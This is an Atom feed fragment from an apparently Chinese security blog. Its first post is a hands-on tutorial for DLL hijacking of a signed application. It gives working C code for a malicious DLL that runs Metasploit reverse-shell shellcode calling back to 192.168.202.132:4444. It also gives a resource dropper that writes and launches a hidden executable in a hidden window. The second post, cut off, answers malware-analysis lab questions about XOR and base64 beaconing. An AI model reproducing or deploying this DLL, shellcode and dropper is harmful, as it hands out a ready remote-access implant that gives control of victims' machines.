    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DLL劫持就是劫持或者替换掉正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。其中有一种手法叫“白加黑”，就是一个“白”的EXE加载“黑“的DLL。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>DLL劫持的原理主要就是windows下加载DLL的顺序。在加载DLL的时候，系统会依次从以下六个位置去查找所需要的DLL文件</p><ol><li>程序所在目录</li><li>系统目录</li><li>16位系统目录</li><li>Windows目录</li><li>当前目录</li><li>PATH环境变量中的各个目录</li></ol><p>只要可以将准备好的DLL放在特定的目录下，先于原先的DLL被加载，就会实现劫持。</p><p>不过在win7之后，微软为了防御DLL劫持，将一些容易被劫持的DLL写入了一个注册表中HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs，在这里的DLL都会被禁止从程序所在目录下调用，只可以在系统目录下调用。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/1.png"></p><h2 id="一些要求"><a href="#一些要求" class="headerlink" title="一些要求"></a>一些要求</h2><p>要实现“白加黑”的话，DLL最好是有很少的导出函数，或是对于一个白应用来说不是必需的DLL，没有此DLL还是可以打开程序正常运行，这样的话都不需要进行函数的转发。白应用调用的自己编写的DLL最好也比较少，这样更加方便。</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>在这里可以使用工具来进行查找，使用Process Monitor工具。</p><p>根据刚才所讲，那么我们理清一下思路，现在需要找到一个可以使用的DLL，那么将某个白应用放在一个目录下，然后使用工具观察其加载DLL的情况，如果它尝试从当前目录下去加载某个DLL，那么可以尝试构造同名DLL来进行劫持。</p><p>在Process Monitor中设置一些过滤条件</p><blockquote><p><strong>Include</strong></p><p>Operation is CreateFile</p><p>Operation is LoadImage</p><p>Path contains .dll</p><p><strong>Exclude</strong></p><p>Result is SUCCESS</p></blockquote><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/2.png"></p><p>这里我随便在网上找了一个某播放器的安装包，是一个带数字签名的白应用，其次这个安装包也不带任何DLL。可以看到在启动它的时候，尝试在我这个123目录下寻找几个DLL，那么可以尝试伪造一下。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/3.png"></p><p>写一个弹计算器的DLL，然后改名为SHFOLDER.dll，具体哪个DLL名字可以用，还需要去实际测试，我试第一个VERSION并不可行，用这个是可以的。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_NORMAL);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>点击运行一下查看效果，成功弹出了计算机。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/1.gif"></p><p>然后在测试的时候，后台的浏览器一直是开着的，查看Process Monitor的时候，发现了一个浏览器的更新程序也在寻找一个DLL，这个也可以拿来利用， 并且这个程序很小，只有一百五十多KB。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/4.png"></p><p>现在来尝试一下利用MSF生成一个远控木马，来操作下。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/5.png"></p><p>然后把它写进DLL中，让DLL启动直接执行这段shellcode。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =<br><span class="hljs-string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x89\xe5&quot;</span><br><span class="hljs-string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><br><span class="hljs-string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span><br><span class="hljs-string">&quot;\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;</span><br><span class="hljs-string">&quot;\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3&quot;</span><br><span class="hljs-string">&quot;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1&quot;</span><br><span class="hljs-string">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span><br><span class="hljs-string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span><br><span class="hljs-string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span><br><span class="hljs-string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span><br><span class="hljs-string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span><br><span class="hljs-string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span><br><span class="hljs-string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xca\x84\x68\x02&quot;</span><br><span class="hljs-string">&quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="hljs-string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span><br><span class="hljs-string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span><br><span class="hljs-string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span><br><span class="hljs-string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span><br><span class="hljs-string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span><br><span class="hljs-string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span><br><span class="hljs-string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span><br><span class="hljs-string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span><br><span class="hljs-string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span><br><span class="hljs-string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    LPVOID Memory = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>    ((<span class="hljs-keyword">void</span>(*)())Memory)();<br>&#125;<br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        run();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后在服务端开启监控，这个时候就出现了问题，这边好像是一直发包发不过去，就没办法了，我也不知道是哪里出问题了。但是我用一个EXE进行测试，发现是没有任何问题的，于是，我就想到不如把EXE放在DLL的资源节里，然后“白加黑”释放资源，再打开exe好了。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/6.png"></p><p>将shellcode编写成一个exe，然后把它放到DLL的资源节中，当加载DLL的时候释放此exe在运行它。</p><p>释放资源</p><p>释放资源这里，一定一定要注意DLL释放资源和EXE是不同的，FindResource这几个函数第一个参数千万不能是NULL，这里要是DLL的句柄，我在这卡了好久，才发现问题。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">Free</span><span class="hljs-params">(UINT uResourceId, WCHAR* szResourceType, <span class="hljs-keyword">char</span>* szFileName)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//如果是DLL的资源释放，必须加载DLL的句柄！！！！</span><br>HMODULE hDll = GetModuleHandle(<span class="hljs-string">L&quot;goopdate.dll&quot;</span>);<br><span class="hljs-comment">// 找到资源</span><br>HRSRC hRsrc = FindResource(hDll, MAKEINTRESOURCE(uResourceId), szResourceType);<span class="hljs-comment">//第一个参数不能是NULL，不然的话无法搜索到资源，其他同样</span><br><span class="hljs-keyword">if</span> (hRsrc == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 获取资源大小</span><br>DWORD dwSize = SizeofResource(hDll, hRsrc);<br><span class="hljs-keyword">if</span> (dwSize &lt;= <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 载入资源</span><br>HGLOBAL hGlobal = LoadResource(hDll, hRsrc);<br><span class="hljs-keyword">if</span> (hGlobal == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 锁定资源，并返回指向资源第一字节的指针</span><br>LPVOID lpRes = LockResource(hGlobal);<br><span class="hljs-keyword">if</span> (lpRes == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//创建一个隐藏文件</span><br>HANDLE hFile = CreateFileA(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (hFile == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>DWORD dwWriten = <span class="hljs-number">0</span>;<br>BOOL bRes = WriteFile(hFile, lpRes, dwSize, &amp;dwWriten, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (bRes == FALSE || dwWriten &lt;= <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>CloseHandle(hFile);<br>CloseHandle(hGlobal);<br>CloseHandle(hRsrc);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>启动进程</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">Create</span><span class="hljs-params">(WCHAR* szFileName)</span></span><br><span class="hljs-function"></span>&#123;<br>STARTUPINFO si;<br>PROCESS_INFORMATION pi;<br><span class="hljs-built_in">ZeroMemory</span>(&amp;si, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(si));<br><span class="hljs-built_in">ZeroMemory</span>(&amp;pi, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pi));<br>si.cb = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(si);<br>si.dwFlags = STARTF_USESHOWWINDOW;<br>si.wShowWindow = SW_HIDE;<br><span class="hljs-comment">//隐藏窗口启动释放的exe</span><br>BOOL flag = <span class="hljs-built_in">CreateProcess</span>(szFileName, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><span class="hljs-keyword">if</span> (flag)<br>&#123;<br><span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br><span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后编译，再改名为要劫持的DLL就可以了。</p><p>将DLL属性设置为隐藏，双击运行后，会释放出加载shellcode的exe，其属性也是隐藏，然后再执行，就成功上线了。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/7.png"></p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/2.gif"></p><h2 id="更正"><a href="#更正" class="headerlink" title="更正"></a>更正</h2><p>经过指正，应该是我的DLL编写的有问题，并且劫持是可以去劫持一个具体的函数的，需要自己去分析一下白应用查看其调用的DLL以及其中函数。</p><p>使用IDA打开白应用，搜索loadlibrary，然后可以看到加载了要被劫持的DLL，goopdate.dll，以及获取其中的DllEntry函数。</p><p><img src="/2021/10/11/%E2%80%9C%E7%99%BD%E5%8A%A0%E9%BB%91%E2%80%9DDLL%E5%8A%AB%E6%8C%81/8.png"></p><p>然后在DLL中构造同名的导出函数DllEntry，将加载shellcode的代码放在其中，就可以成功了，这里就不再放截图了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不过暂时应该还是没有办法过杀软的，因为这个shellcode肯定是会被检测到的，不过免杀不在本篇考虑的范畴内。还有就是DLL的编写，应该是要先分析一下白应用查看其加载的具体函数，然后再编写同名导出函数，在其中实现自己的功能。应该还有其他的方法，不过目前我还没有掌握，慢慢学习吧。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649737096&amp;idx=1&amp;sn=582fb5d65201dc7b6d47b249d485a6c0&amp;chksm=888cf7e7bffb7ef125b76b2a5658fa12d3600ebe8e631d17129a4f08a5a19eb9b3f39307dc89&amp;scene=21">https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649737096&amp;idx=1&amp;sn=582fb5d65201dc7b6d47b249d485a6c0&amp;chksm=888cf7e7bffb7ef125b76b2a5658fa12d3600ebe8e631d17129a4f08a5a19eb9b3f39307dc89&amp;scene=21</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/20">https://security.tencent.com/index.php/blog/msg/20</a></p><p><a href="https://blog.csdn.net/mengyafei43/article/details/10340689">https://blog.csdn.net/mengyafei43/article/details/10340689</a></p><p><a href="https://baijiahao.baidu.com/s?id=1660033739400079723&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1660033739400079723&amp;wfr=spider&amp;for=pc</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;DLL劫持就是劫持或者替换掉正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。其中有一种手法叫“白加黑”，就是一个“白”的EXE加载“黑</summary>
      
    
    
    
    <category term="DLL劫持" scheme="https://b1ackie.cn/categories/DLL%E5%8A%AB%E6%8C%81/"/>
    
    
    <category term="DLL劫持" scheme="https://b1ackie.cn/tags/DLL%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战-实验13</title>
    <link href="https://b1ackie.cn/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/"/>
    <id>https://b1ackie.cn/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/</id>
    <published>2021-10-08T07:15:15.000Z</published>
    <updated>2021-10-13T02:41:08.486Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-13-1"><a href="#Lab-13-1" class="headerlink" title="Lab 13-1"></a>Lab 13-1</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>监控行为可以看到有大量的网络连接</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/1.png"></p><p>使用wireshark抓取数据包，可以看到如图的数据包内容。可以看到域名<a href="http://www.practicalmalwareanalysis.com还有get字段的内容v0lolu5qtfe0se9t./">www.practicalmalwareanalysis.com还有get字段的内容V0lOLU5QTFE0SE9T。</a></p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2.png"></p><p>使用IDA查看程序，可以看到有两个自定义的函数<code>sub_401300</code>，<code>sub_4011C9</code>。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/3.png"></p><p>来分析一下401300，可以看到从资源节中释放出来一些资源，然后调用<code>sub_401190</code>，分析此函数发现是一个与0x3B异或的过程。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/4.png"></p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/5.png"></p><p>资源节内容</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/6.png"></p><p>异或后的结果，可以看到正是访问的域名。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/7.png"></p><p>使用IDA FindCrypt插件可以看到此程序有base64</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/8.png"></p><p>找到地方发现正是第二个函数<code>sub_4011C9</code>之中。发现其进行编码的内容是通过gethostname函数获得的主机名。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/9.png"></p><p>base64过程</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/11.png"></p><p>查看编码后的内容正是get字段的内容。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/10.png"></p><p>继续分析后面的函数，可以看到会访问这个URL<a href="http://www.practicalmalwareanalysis.com/V0lOLU5QTFE0SE9T">www.practicalmalwareanalysis.com/V0lOLU5QTFE0SE9T</a> ，然后会调用InternetReadFile来读取返回的数据，如果返回的数据等于0x6F也就是o的话，那么返回值result就不等于0，就会终止外面的循环。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/15.png"></p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/16.png"></p><h3 id="1-比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？"><a href="#1-比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？" class="headerlink" title="1.比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？"></a>1.比较恶意代码中的字符串（字符串命令的输出）与动态分析提供的有用信息，基于这些比较，哪些元素可能被加密？</h3><p>查看字符串，可以看到base64所用码表，Mozilla/4.0，http://%s/%s，这几个。加密的话就是base64加密，加密元素从这里不太好分析出来。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/12.png"></p><h3 id="2-使用IDA-pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？"><a href="#2-使用IDA-pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？" class="headerlink" title="2.使用IDA pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？"></a>2.使用IDA pro搜索恶意代码中字符串“xor”，以此来查找潜在的加密，你发现了哪些加密类型？</h3><p>4011B8处是3B在进行异或，那么这里重点关注一下，跟进后就是前面分析的xor解密。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/13.png"></p><h3 id="3-恶意代码使用什么密钥加密，加密了什么内容？"><a href="#3-恶意代码使用什么密钥加密，加密了什么内容？" class="headerlink" title="3.恶意代码使用什么密钥加密，加密了什么内容？"></a>3.恶意代码使用什么密钥加密，加密了什么内容？</h3><p>使用的是base64加密，加密的是主机名</p><h3 id="4-使用静态工具FindCrypt2，Krypto-ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？"><a href="#4-使用静态工具FindCrypt2，Krypto-ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？" class="headerlink" title="4.使用静态工具FindCrypt2，Krypto ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？"></a>4.使用静态工具FindCrypt2，Krypto ANALyzer以及IDA熵插件识别一些其他类型的加密机制，你发现了什么？</h3><p>可以发现base64加密</p><h3 id="5-什么类型的加密被恶意代码用来发送部分网络流量？"><a href="#5-什么类型的加密被恶意代码用来发送部分网络流量？" class="headerlink" title="5.什么类型的加密被恶意代码用来发送部分网络流量？"></a>5.什么类型的加密被恶意代码用来发送部分网络流量？</h3><p>base64加密</p><h3 id="6-Base64编码函数在反汇编的何处？"><a href="#6-Base64编码函数在反汇编的何处？" class="headerlink" title="6.Base64编码函数在反汇编的何处？"></a>6.Base64编码函数在反汇编的何处？</h3><p>在反汇编的401000处</p><h3 id="7-恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？"><a href="#7-恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？" class="headerlink" title="7.恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？"></a>7.恶意代码发送的Base64加密数据的最大长度是什么？加密了什么内容？</h3><p>最大长度是12，注意这里的strncpy函数，指定了长度，为12，所以最大是12。加密的内容就是主机名</p><p><img 